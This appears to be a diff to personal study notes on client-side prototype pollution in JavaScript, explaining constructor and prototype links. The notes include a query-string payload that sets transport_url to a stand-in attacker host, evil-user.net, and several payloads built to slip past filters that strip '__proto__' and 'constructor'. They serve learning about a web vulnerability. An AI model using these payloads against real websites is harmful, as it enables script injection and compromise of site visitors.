@@ -42,3 +42,23 @@ now ''https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net''
 ```
 console.trace() is useful for debuggeing purposes
 nice to read https://portswigger.net/web-security/prototype-pollution/client-side
+```
+## pollution via constructor
+```
+->Unless its prototype is set to null, every JavaScript object has a constructor property, which contains a reference to the
+constructor function that was used to create it.
+let myObjectLiteral = {};
+let myObject = new Object();
+myObject.constructor
+->functions are also just objects under the hood. Each constructor function has a prototype property, which points to the prototype
+ that will be assigned to any objects that are created by this constructor.
+hence
+myObject.constructor.prototype is same as myObject.__proto__
+bypasses
+'''
+/?__pro__proto__to__[foo]=bar
+/?__pro__proto__to__.foo=bar
+/?constconstructorructor[protoprototypetype][foo]=bar
+/?constconstructorructor.protoprototypetype.foo=bar
+'''
+```
